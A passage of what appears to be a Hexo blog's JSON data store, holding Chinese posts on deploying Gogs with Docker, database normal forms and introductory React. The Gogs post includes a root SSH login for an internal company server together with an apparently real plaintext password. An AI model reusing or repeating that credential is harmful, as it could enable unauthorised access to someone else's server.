class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[58]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n"},{"title":"数据库范式介绍","date":"2018-05-02T05:50:37.000Z","archives":"SQL范式","_content":"# [数据库范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","source":"_posts/SQL/数据库范式介绍.md","raw":"---\ntitle: 数据库范式介绍\ndate: 2018-05-02 13:50:37\ntags: SQL范式\narchives: SQL范式\ncategories: 数据库\n---\n# [数据库范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","slug":"SQL/数据库范式介绍","published":1,"updated":"2018-05-05T01:26:56.919Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbx001wr8xjwb6vuz52","content":"<h1 id=\"数据库范式介绍\"><a href=\"#数据库范式介绍\" class=\"headerlink\" title=\"数据库范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">数据库范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数据库范式介绍\"><a href=\"#数据库范式介绍\" class=\"headerlink\" title=\"数据库范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">数据库范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n"},{"title":"React-02","date":"2017-09-14T14:51:40.000Z","archives":"前端","_content":"React作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","source":"_posts/WebFramework/React-02.md","raw":"---\ntitle: React-02\ndate: 2017-09-14 22:51:40\ntags: React\narchives: 前端\ncategories: 前端\n---\nReact作用：提供jsx的语法糖支持和Component的功能\nReactDom作用：渲染虚拟Dom和控制桌面内容\nReactDom.render(){渲染虚拟Dom,Element元素}\n\n核心概念：组件化！\n组件：创建一个构造函数，使用ES6语法。\n````\nclass App extends Component{\n  constructor(){  //（ES6提供方法）\n    和 super()结合使用,来继承Compoent的方法\n    引入护法 state 状态（数据驱动视图）\n    //所有初始化属性都会存放在state\n    this.state={\n      count:0;\n    }\n  }\n  xxx(){//其他自定义事件}\n  '{}'在任何地方都能插值\n  render(){   //（React提供方法）\n    *React插入事件的方法\n    '{}'大括号的用法\n    <button onClick={this.clickHandler}>点我</button>\n  }\n  //React里面function的=>(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this\n  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法\n  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次\n}\n````\n01.19分分析state和生命周期的匹配与使用\n\n小心this的指向！\n\n09-14 02 29分 :\n插值数组\n\n\n","slug":"WebFramework/React-02","published":1,"updated":"2018-05-05T01:25:38.636Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nby001zr8xjikum4l2o","content":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 